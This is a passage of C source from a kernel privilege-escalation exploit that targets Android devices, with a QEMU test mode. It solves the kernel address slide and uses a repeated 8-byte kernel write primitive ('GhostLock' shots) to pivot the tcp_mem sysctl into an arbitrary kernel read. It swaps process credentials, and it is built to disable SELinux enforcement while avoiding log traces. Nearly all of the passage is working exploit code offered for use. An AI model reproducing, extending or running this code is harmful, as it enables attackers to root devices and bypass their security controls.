        for (k = 0x1000000000ULL; k < 0x3000000000ULL; k += 0x200000ULL) {
            int ok = 1;
            for (i = 0; i < nips; i++) {
                uint64_t a = ips[i] - k;
                if (a < LINK_STEXT || a >= LINK_ETEXT) { ok = 0; break; }
            }
            if (ok) {
                if (d_candidate_valid((uint64_t)k)) { found++; best = k; }
                else L("D: candidate %016llx rejected by d_candidate_valid "
                       "(range/align/segment)", (unsigned long long)k);
            }
        }
    }
    if (found != 1) { L("D: candidates=%d (need exactly 1)", found); return -3; }
    D = (unsigned long)best;
    L("D: %016lx from %d kernel IPs (samples=%d iters=%lu)", D, nips, g_nsamp, it);
    return 0;
}

/* glx_p7 fix 2 (fact 628): a bad D solve used to surface only as garbage
 * pco[] reads in R1 (the device saw 0x2c257 / 0x4237e).  Two independent
 * sampling windows must now agree, and every candidate must pass
 * d_candidate_valid().  Up to D_RETRY_MAX attempts; a failure here aborts
 * BEFORE any GhostLock shot is issued (safe SKIP, no shot into a bad D). */
static int dev_solve_D_checked(void)
{
    int i;
    for (i = 1; i <= D_RETRY_MAX; i++) {
        unsigned long d1;
        int rc = dev_solve_D();
        if (rc != 0) {
            L("D: attempt %d/%d solve rc=%d (retrying)", i, D_RETRY_MAX, rc);
            continue;
        }
        d1 = D;
        if (!d_candidate_valid((uint64_t)d1)) {
            L("D: attempt %d/%d candidate %016lx rejected (range/align/segment)",
              i, D_RETRY_MAX, d1);
            D = 0;
            continue;
        }
        rc = dev_solve_D();                 /* independent second window */
        if (rc == 0 && D == d1) {
            L("D: attempt %d/%d confirmed by a second independent sampling "
              "window: %016lx", i, D_RETRY_MAX, d1);
            return 0;
        }
        L("D: attempt %d/%d second window rc=%d D=%016lx != %016lx (retrying)",
          i, D_RETRY_MAX, rc, D, d1);
        D = 0;
    }
    L("D: %d attempts exhausted -> safe SKIP (no shot issued)", D_RETRY_MAX);
    return -5;
}

/* --------------------------------------------------------------- read path */
/* DELIVERY LEG v4 (fact 518/519).  The device policy gives the kernel domain
 * NO proc_net file permission, so V8_PTRS / N9V_STATE cannot be read by the
 * process that performed the cred swap.  Split the primitive:
 *     parent  : performs the pivot WRITE (GhostLock; gl_rw in QEMU)
 *     child   : forked BEFORE the swap, keeps u:r:shell:s0, re-opens the proc
 *               file on every request and returns the parsed bytes.
 * The child never issues an 8-byte write and never touches the P0 spray slot. */
static int listen_ab(const char *name);          /* defined below */
static int self_ctx(char *out, int n);           /* defined below (glx_p4) */
static void reader_stop(void);                   /* glx_p7 fix 1 (fact 628) */
static void reader_stop_atexit(void);
static const char *SRV_SHELL = "glx-shell-454";

static int parse_proc_nums(const char *txt, unsigned char *outb)
{
    unsigned long long vals[16];
    int n, i, got = 0, Lw, unit, skip;

    n = parse_nums(txt, vals, 16);
    Lw = (int)P.maxlen - 8;
    if (Lw <= 0) Lw = 16;
    if (Lw > 16) Lw = 16;
    unit = (P.cls == 8) ? 8 : 4;
    skip = (P.cls == 8) ? 1 : 2;
    if (n < skip + 1) return -12;
    for (i = skip; i < n && got < Lw; i++) {
        int c = Lw - got;
        if (c > unit) c = unit;
        memcpy(outb + got, &vals[i], c);
        got += c;
    }
    return got;
}

static int pivot_write_qemu(unsigned long A)
{
    unsigned char chk[8];
    char cmd[96];

    g_shots++;
    snprintf(cmd, sizeof(cmd), "w %lx %lx", P.data_slot, A - 8);
    ctl(cmd, NULL, 0);
    if (gl_hex(P.data_slot, chk, 8) != 8 || rd64u(chk, 0) != (A - 8)) {
        L("WCHECK1_FAIL A=%lx slot=%lx got=%lx want=%lx", A, P.data_slot, rd64u(chk, 0), A - 8);
        return -10;
    }
    if (gl_hex(A - 8, chk, 8) == 8 && rd64u(chk, 0) != P.ent) {
        L("WCHECK2_FAIL A=%lx mem[A-8]=%lx want_ent=%lx", A, rd64u(chk, 0), P.ent);
        return -11;
    }
    return 0;
}

static int pivot_write_dev(unsigned long A)
{
    /* fact 563 M5: the shot is counted once, inside dev_write8 (the only
     * place that really issues the trigger).  Counting here as well made the
     * device shot report double the QEMU/orchestration count. */
    if (dev_write8(P.data_slot, A - 8) != 0) return -20;
    return 0;
}

/* ====================================================== glx_p6 C1 timeouts
 * Item ② (594 C-4).  p5 had poll(8000) + SO_RCVTIMEO(5 s) = 13 s worst case
 * inside a single reader op while the parent only waited 10 s: the parent gave
 * up, the child stayed blocked in poll() and NEG/STOP queued behind it.
 * There is one self-consistent budget now, checked at compile time:
 *
 *   child  V4_OP_C1       = C1_ACCEPT_POLL_MS + C1_REPORT_RECV_MS = 5 000 ms
 *   child  V4_OP_C1_REPLY = C1_POST_POLL_MS   + C1_POST_RECV_MS   = 5 000 ms
 *   parent every op       = READER_TIMEOUT_MS                     = 10 000 ms
 *
 * So each half of the C1 exchange keeps a 5 s margin and no single child op
 * can outlive the parent's wait.  A parent-side C1 timeout is mapped to
 * C1_SKIP (never a failure) and the child is drained with reader_wait_idle()
 * before the next op is queued -- item ②: a C1 timeout must never turn the
 * run into DELIVERY_FAIL.
 */
#define C1_ACCEPT_POLL_MS   4000   /* first accept window (client pre-queued) */
#define C1_REPORT_RECV_MS   1000   /* read the UA27 report (first connection) */
#define C1_POST_POLL_MS     2000   /* second accept window, after the reply   */
#define C1_POST_RECV_MS     3000   /* SO_RCVTIMEO on the POST= read (~3 s)    */
#define C1_ACCEPT_WORST_MS  (C1_ACCEPT_POLL_MS + C1_REPORT_RECV_MS)
#define C1_POST_WORST_MS    (C1_POST_POLL_MS + C1_POST_RECV_MS)
#define READER_TIMEOUT_MS   10000  /* parent wait for any single reader op   */
#define C1_IDLE_WAIT_MS     8000   /* drain budget after a parent C1 timeout */

_Static_assert(C1_ACCEPT_WORST_MS + 2000 <= READER_TIMEOUT_MS,
               "C1 accept+report must fit the parent window with margin");
_Static_assert(C1_POST_WORST_MS + 2000 <= READER_TIMEOUT_MS,
               "reply+POST write-back must fit the parent window with margin");
_Static_assert(C1_POST_RECV_MS == 3000, "POST= SO_RCVTIMEO is ~3 s");
_Static_assert(C1_IDLE_WAIT_MS > C1_POST_WORST_MS,
               "drain budget must exceed one whole child C1 op");

/* "POST=<rc>" parser: leading text and an optional sign are tolerated, and 1
 * is returned only when a number really was parsed.  Shared with the host
 * unit test (both protocol directions are exercised there). */
static int c1_parse_post(const char *s, int *out)
{
    const char *p;
    int neg = 0, any = 0, v = 0;

    if (!s || !(p = strstr(s, "POST="))) return 0;
    p += 5;
    if (*p == '-') { neg = 1; p++; }
    else if (*p == '+') p++;
    while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; any = 1; }
    if (!any) return 0;
    *out = neg ? -v : v;
    return 1;
}

/* Item ①: the second-connection channel wins over the field carried inside the
 * first report (an old client can only do the latter).  -999 = not reported. */
static int c1_post_select(int post_chan, int post_report)
{
    return post_chan != -999 ? post_chan : post_report;
}

/* ---- shared-memory request channel to the pre-swap shell reader --- */
#define V4_OP_READ 1
#define V4_OP_SELF 2
#define V4_OP_NEG  3
#define V4_OP_C1   4          /* child accepts/reads the UA27 report      */
#define V4_OP_C1_REPLY 5      /* child writes g_rq->reply and closes      */
#define V4_OP_STOP 6          /* child exits cleanly (no kill() needed)   */
struct v4rq {
    volatile int seq;
    volatile int done;
    volatile int op;
    unsigned long addr;
    unsigned char out[64];
    volatile int n;
    volatile int rc;
    volatile int child_uid;
    volatile int child_euid;
    volatile int neg_init_rc;
    volatile int neg_vr_rc;
    volatile int c1_rc;
    volatile int peer_uid;
    volatile int peer_pid;
    volatile int c1_post;        /* glx_p6 item ①: POST=<rc> value          */
    volatile int c1_post_src;    /* 0 none / 1 second connection / 2 report  */
    char child_ctx[64];
    char reply[256];
};
static struct v4rq *g_rq;
static pid_t g_reader_pid = -1;
static int g_reader_up;
static int g_listen_fd = -1;
static const char *g_neg_target;      /* --neg-target, default /init on device */
static int g_c1_fd = -1;              /* child-local accepted fd (never shared) */

static void reader_child_loop(void)
{
    int last = 0;

    for (;;) {
        if (g_rq->seq == last) { usleep(200); continue; }
        last = g_rq->seq;
        if (g_rq->op == V4_OP_READ) {
            char txt[8192];
            int n = rd_file(P.path, txt, sizeof(txt));
            if (n < 0) g_rq->n = n;
            else       g_rq->n = parse_proc_nums(txt, g_rq->out);
            g_rq->rc = g_rq->n;
        } else if (g_rq->op == V4_OP_SELF) {
            g_rq->child_uid = getuid();
            g_rq->child_euid = geteuid();
            g_rq->child_ctx[0] = 0;
            self_ctx(g_rq->child_ctx, sizeof(g_rq->child_ctx));
            g_rq->rc = 0;
        } else if (g_rq->op == V4_OP_NEG) {
            int fd;
            fd = open(g_neg_target ? g_neg_target : "/init", O_RDONLY);
            g_rq->neg_init_rc = (fd >= 0) ? 0 : -errno;
            if (fd >= 0) close(fd);
            fd = open(g_vr_target ? g_vr_target : DEV_VR_TARGET, O_RDONLY);
            g_rq->neg_vr_rc = (fd >= 0) ? 0 : -errno;
            if (fd >= 0) close(fd);
            g_rq->rc = 0;
        } else if (g_rq->op == V4_OP_C1) {
            struct pollfd pfd;
            int r;
            g_c1_fd = -1;
            g_rq->c1_rc = -999;
            g_rq->c1_post = -999;      /* item ①: cleared for every C1 op     */
            g_rq->c1_post_src = 0;
            g_rq->peer_uid = -1;
            g_rq->peer_pid = -1;
            g_rq->child_ctx[0] = 0;
            g_rq->out[0] = 0;
            pfd.fd = g_listen_fd;
            pfd.events = POLLIN;
            pfd.revents = 0;
            r = poll(&pfd, 1, C1_ACCEPT_POLL_MS);   /* item ②: 4 000 ms,
                                        * half of the parent's 10 000 ms
                                        * budget (p5 used 8 000 and then
                                        * another 5 000 on the read) */
            if (r > 0 && (pfd.revents & POLLIN)) {
                struct ucred uc;
                socklen_t ul = sizeof(uc);
                struct timeval tv;
                tv.tv_sec = C1_REPORT_RECV_MS / 1000;
                tv.tv_usec = (C1_REPORT_RECV_MS % 1000) * 1000;
                g_c1_fd = accept(g_listen_fd, NULL, NULL);
                if (g_c1_fd >= 0) {
                    if (getsockopt(g_c1_fd, SOL_SOCKET, SO_PEERCRED, &uc, &ul) == 0) {
                        g_rq->peer_uid = uc.uid;
                        g_rq->peer_pid = uc.pid;
                    }
                    ul = sizeof(g_rq->child_ctx) - 1;
                    if (getsockopt(g_c1_fd, SOL_SOCKET, SO_PEERSEC,
                                   g_rq->child_ctx, &ul) < 0)
                        strcpy(g_rq->child_ctx, "?");
                    setsockopt(g_c1_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                    {
                        int n = read(g_c1_fd, g_rq->out, sizeof(g_rq->out) - 1);
                        if (n < 0) n = -errno;
                        g_rq->n = n;
                        if (n > 0) g_rq->out[n] = 0;
                    }
                    g_rq->c1_rc = 0;
                } else {
                    g_rq->c1_rc = -errno;
                }
            } else {
                g_rq->c1_rc = (r == 0) ? -1000 : -2000;
            }
            g_rq->rc = g_rq->c1_rc;
        } else if (g_rq->op == V4_OP_STOP) {
            __sync_synchronize();
            g_rq->done = last;
            _exit(0);
        } else if (g_rq->op == V4_OP_C1_REPLY) {
            if (g_c1_fd >= 0) {
                int len = (int)strlen(g_rq->reply);
                if (len && write(g_c1_fd, g_rq->reply, len) < 0) { }
                close(g_c1_fd);
                g_c1_fd = -1;
            }
            /* glx_p6 item ①: the client may now open ONE more connection and
             * write "POST=<rc>" -- the result of its own post-reply connect.
             * That is the only *live* proof that the delta's connectto row
             * works while enforcing=1 (the first connection can predate the
             * delta).  Bounded by C1_POST_WORST_MS so the parent's 10 s wait
             * for THIS op can never be overrun. */
            {
                struct pollfd p2;
                int r2;
                p2.fd = g_listen_fd;
                p2.events = POLLIN;
                p2.revents = 0;
                r2 = poll(&p2, 1, C1_POST_POLL_MS);
                if (r2 > 0 && (p2.revents & POLLIN)) {
                    int fd2 = accept(g_listen_fd, NULL, NULL);
                    if (fd2 >= 0) {
                        struct timeval tv2;
                        char pb[64];
                        int n2;
                        tv2.tv_sec = C1_POST_RECV_MS / 1000;
                        tv2.tv_usec = (C1_POST_RECV_MS % 1000) * 1000;
                        setsockopt(fd2, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof(tv2));
                        n2 = read(fd2, pb, sizeof(pb) - 1);
                        if (n2 > 0) {
                            int pv = -999;
                            pb[n2] = 0;
                            if (c1_parse_post(pb, &pv)) {
                                g_rq->c1_post = pv;
                                g_rq->c1_post_src = 1;
                            }
                        }
                        close(fd2);
                    }
                }
            }
            g_rq->rc = 0;
        }
        __sync_synchronize();
        g_rq->done = last;
    }
}

static int reader_request_to(int op, unsigned long addr, int timeout_ms)
{
    int seq, t, loops;

    if (!g_reader_up || !g_rq) return -1;
    g_rq->op = op;
    g_rq->addr = addr;
    g_rq->n = -999;
    g_rq->rc = -999;
    __sync_synchronize();
    seq = g_rq->seq + 1;
    g_rq->seq = seq;
    loops = timeout_ms * 10;                /* usleep(100) => 100 us / loop */
    for (t = 0; t < loops; t++) {
        if (g_rq->done == seq) return 0;
        usleep(100);
    }
    return -1;
}

/* item ②: one budget for every op.  After a parent-side timeout the child may
 * still be finishing its (bounded) work; drain it so the next request is not
 * queued behind a busy reader.  Returns 0 when the child is idle. */
static int reader_wait_idle(int ms)
{
    int t;

    if (!g_reader_up || !g_rq) return -1;
    for (t = 0; t < ms; t++) {
        if (g_rq->done == g_rq->seq) return 0;
        usleep(1000);
    }
    return -1;
}

static int reader_request(int op, unsigned long addr)
{
    return reader_request_to(op, addr, READER_TIMEOUT_MS);
}

static int start_reader(void)
{
    pid_t p;

    g_rq = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_rq == MAP_FAILED) { g_rq = NULL; return -1; }
    memset(g_rq, 0, sizeof(*g_rq));
    /* A socket's SID is fixed at creation: binding while the parent is still
     * u:r:shell:s0 makes the listener shell-labelled.  The ONLY delivery delta
     * row a real Termux (u:r:untrusted_app_27) peer needs is connectto. */
    g_listen_fd = listen_ab(SRV_SHELL);
    if (g_listen_fd < 0) { L("V4 listener failed rc=%d", g_listen_fd); return -2; }
    p = fork();
    if (p < 0) { L("V4 reader fork failed errno=%d", errno); return -3; }
    if (p == 0) {
        /* v4b: the child owns accept() -- a kernel-domain accept on a
         * shell-labelled listener is denied (measured EACCES).
         * glx_p7 fix 1: die with the parent even if the parent is SIGKILLed
         * (fact 628's orphan listener).  The getppid() re-check covers the
         * race where the parent died between fork() and prctl(). */
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        if (getppid() == 1) _exit(0);
        reader_child_loop();
        _exit(0);
    }
    g_reader_pid = p;
    g_reader_up = 1;
    atexit(reader_stop_atexit);
    return 0;
}

/* glx_p7 fix 1 (fact 628): the reader child must never survive its parent.
 * It is forked BEFORE the cred swap, so every early return / abort path used
 * to leave it blocked in poll() on @glx-shell-454 (observed orphan pid 23193),
 * which also made a later run fail to bind.  Teardown:
 *   1) V4_OP_STOP -> the child _exit(0)s itself (no kill needed);
 *   2) waitpid bounded to 1 s, SIGKILL as a last resort;
 *   3) close OUR listener fd -- an abstract socket's name disappears only when
 *      every descriptor on it is closed (the child closed its copy on exit);
 *   4) idempotent + registered with atexit(), so no plain return from main()
 *      can leak it.  The child additionally sets PR_SET_PDEATHSIG=SIGKILL so a
 *      parent killed by SIGKILL/oops cannot orphan it either. */
static void reader_stop(void)
{
    int t;
    if (g_reader_up && g_rq && g_reader_pid > 0) {
        if (reader_request(V4_OP_STOP, 0) != 0)
            L("reader_stop: V4_OP_STOP timed out; reaping by pid");
        for (t = 0; t < 100; t++) {                 /* <= 1 s */
            int st = 0;
            pid_t w = waitpid(g_reader_pid, &st, WNOHANG);
            if (w == g_reader_pid || w < 0) break;
            usleep(10000);
        }
        if (t >= 100) {
            L("reader_stop: child %d still alive after 1 s -> SIGKILL",
              (int)g_reader_pid);
            kill(g_reader_pid, SIGKILL);
            waitpid(g_reader_pid, NULL, 0);
        }
    }
    if (g_c1_fd >= 0) { close(g_c1_fd); g_c1_fd = -1; }
    if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
    if (g_reader_up)
        L("reader_stop: @%s closed, child %d reaped", SRV_SHELL,
          (int)g_reader_pid);
    g_reader_up = 0;
}
static void reader_stop_atexit(void) { reader_stop(); }

static int read_window(unsigned long A, unsigned char *outb)
{
    int w, n;

    w = g_qemu ? pivot_write_qemu(A) : pivot_write_dev(A);
    if (w != 0) return w;
    if (g_reader_up) {
        if (reader_request(V4_OP_READ, A) != 0) {
            L("V4 reader timeout A=%016lx seq=%d", A, g_rq ? g_rq->seq : -1);
            return -100;
        }
        n = g_rq->n;
        if (n < 0) { L("V4 reader read failed A=%016lx rc=%d", A, n); return n; }
        memcpy(outb, (const void *)g_rq->out, n);
        L("SHOT %d READ(child/shell) A=%016lx bytes=%d %02x%02x%02x%02x%02x%02x%02x%02x",
          g_shots, A, n,
          n > 0 ? outb[0] : 0, n > 1 ? outb[1] : 0, n > 2 ? outb[2] : 0,
          n > 3 ? outb[3] : 0, n > 4 ? outb[4] : 0, n > 5 ? outb[5] : 0,
          n > 6 ? outb[6] : 0, n > 7 ? outb[7] : 0);
        return n;
    }
    {
        char txt[8192];
        n = rd_file(P.path, txt, sizeof(txt));
        if (n < 0) return n;
        n = parse_proc_nums(txt, outb);
        L("SHOT %d READ(parent/shell) A=%016lx bytes=%d", g_shots, A, n);
        return n;
    }
}

/* glx_p4: every read_window() call is one GhostLock shot; tag it for the
 * per-shot ledger (fact 575 item 4). */
static int read_tag(const char *tag, unsigned long A, unsigned char *b)
{
    shot_tag(tag);
    return read_window(A, b);
}

static int pick_pivot_qemu(void)
{
    char *p;
    unsigned long ent = 0, dent = 0, dval = 0;
    unsigned int ml = 0, md = 0;
    char hn[48] = {0};

    P.path = "/proc/sys/net/ipv4/tcp_mem";
    P.name = "tcp_mem";
    if (ctl("fent /proc/sys/net/ipv4/tcp_mem tcp_mem", cbuf, sizeof(cbuf)) < 0) return -1;
    p = strstr(cbuf, "FENT hit ");
    if (!p) { L("FENT miss"); return -1; }
    {
        char *q;
        if (!(q = strstr(p, "ent="))) return -1;
        ent = strtoul(q + 4, NULL, 16);
        if (!(q = strstr(p, "data="))) return -1;
        dval = strtoul(q + 5, NULL, 16);
        if (!(q = strstr(p, "maxlen="))) return -1;
        ml = (unsigned int)strtoul(q + 7, NULL, 10);
        if (!(q = strstr(p, "mode=0x"))) return -1;
        md = (unsigned int)strtoul(q + 7, NULL, 16);
        if ((q = strstr(p, "hname="))) sscanf(q + 6, "%47s", hn);
    }
    (void)dval;
    if (ctl("ctl ipv4_table tcp_mem", cbuf, sizeof(cbuf)) > 0) {
        char *q = strstr(cbuf, "ENT ");
        char *e = q ? strstr(q, "ent=") : NULL;
        if (e) dent = strtoul(e + 4, NULL, 16);
    }
    P.ent = ent;
    P.data_slot = ent + 8;
    P.maxlen = ml;
    P.mode = md;
    P.cls = (strstr(hn, "longvec") || strstr(hn, "long8")) ? 8 : 4;
    L("pivot tcp_mem ent=%lx data_slot=%lx maxlen=%u mode=%x handler=%s static=%lx cls=%d",
      ent, P.data_slot, ml, md, hn, dent, P.cls);
    return ent ? 0 : -1;
}

static int pick_pivot_device(void)
{
    P.path = "/proc/sys/net/ipv4/tcp_mem";
    P.name = "tcp_mem";
    P.ent = A_tcp_ent;
    P.data_slot = A_tcp_ent + 8;
    P.maxlen = 0x18;
    P.mode = 0;
    P.cls = 8;
    L("pivot tcp_mem ent=%lx data_slot=%lx", P.ent, P.data_slot);
    return 0;
}

/* --------------------------------------------------------------- S0 / P0 */
static int preflight(void)
{
    char b[512];
    int n, ok = 1;
    L("S0 preflight start mode=%s round=%d uid=%d euid=%d nproc=%ld",
      g_qemu ? "qemu" : "device", g_round, getuid(), geteuid(),
      sysconf(_SC_NPROCESSORS_ONLN));
    if (rd_file("/proc/self/attr/current", b, sizeof(b)) >= 0)
        L("preflight attr=%s", b);
    else
        L("preflight attr unreadable (%d)", errno);
    {
        int fd = open("/proc/self/status", O_RDONLY);
        if (fd >= 0) {
            char s[8192]; int r = read(fd, s, sizeof(s) - 1);
            close(fd);
            if (r > 0) {
                char *p;
                s[r] = 0;
                p = strstr(s, "TracerPid:");
                if (p) L("preflight %.24s", p);
            }
        }
    }
    if (rd_file("/proc/sys/net/ipv4/tcp_mem", b, sizeof(b)) < 0) {
        L("preflight tcp_mem unreadable (%d)", errno); ok = 0;
    } else {
        L("preflight tcp_mem='%.60s'", b);
    }
    if (rd_file("/proc/meminfo", b, sizeof(b)) > 0)
        L("preflight meminfo[0]=%.40s", b);
    if (rd_file("/sys/fs/selinux/enforce", b, sizeof(b)) >= 0)
        L("preflight enforce=%s", b);
    n = rd_file("/sys/fs/selinux/checkreqprot", b, sizeof(b));
    L("preflight checkreqprot=%s", n >= 0 ? b : "(n/a)");
    if (n >= 0 && b[0] != '0') { L("preflight checkreqprot != 0"); ok = 0; }
    res("S0_PREFLIGHT", ok, "see log");
    return ok ? 0 : -1;
}

static int qemu_solve_D(void)
{
    unsigned long text;
    if (ctl("dump", dbuf, sizeof(dbuf)) < 0) { L("no glctl"); return -1; }
    text = sym_get(dbuf, "_text");
    if (!text) return -1;
    D = text - Q_LINK_TEXT;
    A_text = text;
    A_init_cred = sym_get(dbuf, "init_cred");
    A_init_task = sym_get(dbuf, "init_task");
    A_state = sym_get(dbuf, "selinux_state");
    A_pco = sym_get(dbuf, "__per_cpu_offset");
    A_rq = sym_get(dbuf, "runqueues");
    off_real = off_get(dbuf, "real_cred");
    off_cred = off_get(dbuf, "cred");
    off_comm = off_get(dbuf, "comm");
    off_ptracer = off_get(dbuf, "ptracer_cred");
    cred_euid = 0x14;
    {
        const char *p;
        if (ctl("rqs", cbuf, sizeof(cbuf)) >= 0 &&
            (p = strstr(cbuf, "RQS HIT off=")) != NULL)
            rq_curr_off = strtoul(p + 12, NULL, 16);
    }
    L("D=%016lx _text=%016lx init_cred=%lx init_task=%lx state=%lx pco=%lx rq=%lx",
      D, A_text, A_init_cred, A_init_task, A_state, A_pco, A_rq);
    L("offsets real=0x%lx cred=0x%lx comm=0x%lx ptracer=0x%lx rq_curr=0x%lx",
      off_real, off_cred, off_comm, off_ptracer, rq_curr_off);
    res("S0_D_SOLVE", D && off_cred == off_real + 8 && off_ptracer + 8 == off_real,
        "D=%lx offs real=0x%lx cred=0x%lx ptracer=0x%lx", D, off_real, off_cred, off_ptracer);
    return 0;
}

static unsigned long select_P0(void)
{
    unsigned long V = 0;
    unsigned char t[8];
    int i;
    if (g_qemu) {
        for (i = 0; i < NQCAND; i++) {
            unsigned long cand = QCAND[i].a + D;
            if ((cand & 0xffff) != 0 || ((cand >> 16) & 1) == 0) continue;
            if (gl_hex(cand + 8, t, 8) != 8) continue;
            if (rd64u(t, 0) == 0xdeadbeefcafef00dUL) continue;
            V = cand;
            L("P0=%016lx (%s) verified mapped", V, QCAND[i].n);
            break;
        }
    } else {
        /* P4 (intent 598): self-page P0.  N9/N10 store A_state+1 into p0+8 /
         * p0+9 (the rb_erase main store); with the static rank-1 candidate
         * (__log_buf) that 8-byte chunk is kernel log text and shows up in
         * dmesg.  Anchoring P0 inside our own pmsg/ramoops data area keeps the
         * primary store in a buffer we already own and re-zero before every
         * shot.  The reverse-main-write invariants are unchanged:
         *   p0 % 64K == 0, (p0>>16)&1 == 1  => after *(state+1)=p0:
         *     state[0] disabled=0, state[1] enforcing=0, state[2] checkreqprot=0,
         *     state[3] initialized bit0=1, state[4..8] = p0>>24 (= policycap
         *     bytes, same situation as the __log_buf anchor).
         * N10 then writes p0+1, whose low byte 1 flips enforcing back to 1. */
        unsigned long off;
        if (!is_kptr(g_vmap_base) || (g_vmap_base & 0xFFFFFUL) != 0) {
            L("P0: pmsg vmap base=%016lx unusable for the self-page anchor",
              g_vmap_base);
            return 0;
        }
        for (off = 0x10000UL; off < 0x100000UL; off += 0x10000UL) {
            unsigned long cand = g_vmap_base + off;
            if ((cand & 0xffffUL) != 0 || ((cand >> 16) & 1) == 0) continue;
            if (cand + 16 >= g_vmap_base + PMSG_DATA_LEN) continue;
            V = cand;
            L("P0=%016lx self-page off=%#lx (own pmsg ring, no dmesg footprint)",
              V, off);
            break;
        }
        if (!V) L("P0: no self-page candidate for base=%016lx", g_vmap_base);
    }
    return V;
}

/* ---------------------------------------------------------- sha256 (i492) */
struct sha256_ctx { uint32_t h[8]; uint64_t len; unsigned char buf[64]; size_t n; };

static const uint32_t sha256_k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

static uint32_t ror32(uint32_t x, int k) { return (x >> k) | (x << (32 - k)); }

static void sha256_block(struct sha256_ctx *c, const unsigned char *p)
{
    uint32_t w[64], a, b, cc, d, e, f, g, h;
    int i;
    for (i = 0; i < 16; i++)
        w[i] = ((uint32_t)p[4*i] << 24) | ((uint32_t)p[4*i+1] << 16) |
               ((uint32_t)p[4*i+2] << 8) | (uint32_t)p[4*i+3];
    for (i = 16; i < 64; i++) {
        uint32_t s0 = ror32(w[i-15], 7) ^ ror32(w[i-15], 18) ^ (w[i-15] >> 3);
        uint32_t s1 = ror32(w[i-2], 17) ^ ror32(w[i-2], 19) ^ (w[i-2] >> 10);
        w[i] = w[i-16] + s0 + w[i-7] + s1;
    }
    a = c->h[0]; b = c->h[1]; cc = c->h[2]; d = c->h[3];
    e = c->h[4]; f = c->h[5]; g = c->h[6]; h = c->h[7];
    for (i = 0; i < 64; i++) {
        uint32_t S1 = ror32(e, 6) ^ ror32(e, 11) ^ ror32(e, 25);
        uint32_t ch = (e & f) ^ ((~e) & g);
        uint32_t t1 = h + S1 + ch + sha256_k[i] + w[i];
        uint32_t S0 = ror32(a, 2) ^ ror32(a, 13) ^ ror32(a, 22);
        uint32_t mj = (a & b) ^ (a & cc) ^ (b & cc);
        uint32_t t2 = S0 + mj;
        h = g; g = f; f = e; e = d + t1;
        d = cc; cc = b; b = a; a = t1 + t2;
    }
    c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d;
    c->h[4] += e; c->h[5] += f; c->h[6] += g; c->h[7] += h;
}

static void sha256_init(struct sha256_ctx *c)
{
    static const uint32_t iv[8] = {
        0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
        0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19 };
    memcpy(c->h, iv, sizeof(iv));
    c->len = 0; c->n = 0;
}

static void sha256_update(struct sha256_ctx *c, const void *data, size_t len)
{
    const unsigned char *p = (const unsigned char *)data;
    c->len += len;
    while (len) {
        size_t k = 64 - c->n;
        if (k > len) k = len;
        memcpy(c->buf + c->n, p, k);
        c->n += k; p += k; len -= k;
        if (c->n == 64) { sha256_block(c, c->buf); c->n = 0; }
    }
}

static void sha256_final(struct sha256_ctx *c, unsigned char out[32])
{
    uint64_t bits = c->len * 8;
    unsigned char pad = 0x80;
    int i;
    sha256_update(c, &pad, 1);
    pad = 0;
    while (c->n != 56) sha256_update(c, &pad, 1);
    for (i = 7; i >= 0; i--) { unsigned char b = (unsigned char)(bits >> (8 * i)); sha256_update(c, &b, 1); }
    for (i = 0; i < 8; i++) {
        out[4*i]   = (unsigned char)(c->h[i] >> 24);
        out[4*i+1] = (unsigned char)(c->h[i] >> 16);
        out[4*i+2] = (unsigned char)(c->h[i] >> 8);
        out[4*i+3] = (unsigned char)(c->h[i]);
    }
}

static int sha256_file(const char *path, char hex[65])
{
    static unsigned char buf[65536];
    struct sha256_ctx c;
    unsigned char d[32];
    int fd, r, i;
    static const char hx[] = "0123456789abcdef";
    fd = open(path, O_RDONLY);
    if (fd < 0) return -errno;
    sha256_init(&c);
    while ((r = read(fd, buf, sizeof(buf))) > 0) sha256_update(&c, buf, (size_t)r);
    close(fd);
    if (r < 0) return -EIO;
    sha256_final(&c, d);
    for (i = 0; i < 32; i++) { hex[2*i] = hx[d[i] >> 4]; hex[2*i+1] = hx[d[i] & 15]; }
    hex[64] = 0;
    return 0;
}

static unsigned long rd32u(const unsigned char *b, int off)
{
    return ((unsigned long)b[off]) | ((unsigned long)b[off+1] << 8) |
           ((unsigned long)b[off+2] << 16) | ((unsigned long)b[off+3] << 24);
}

/* /sys/fs/selinux/class entry count (device C.53 = 104).  <0 when unreadable. */
static int class_count_selinuxfs(void)
{
    DIR *d = opendir("/sys/fs/selinux/class");
    struct dirent *e;
    int n = 0;
    if (!d) return -errno;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.' &&
            (e->d_name[1] == 0 || (e->d_name[1] == '.' && e->d_name[2] == 0)))
            continue;
        n++;
    }
    closedir(d);
    return n;
}

/* S0_DELTA_GATE -- the shipped device blob is asserted byte-exact (size +
 * sha256 + SELinux policy magic/version) and cross-checked against the live
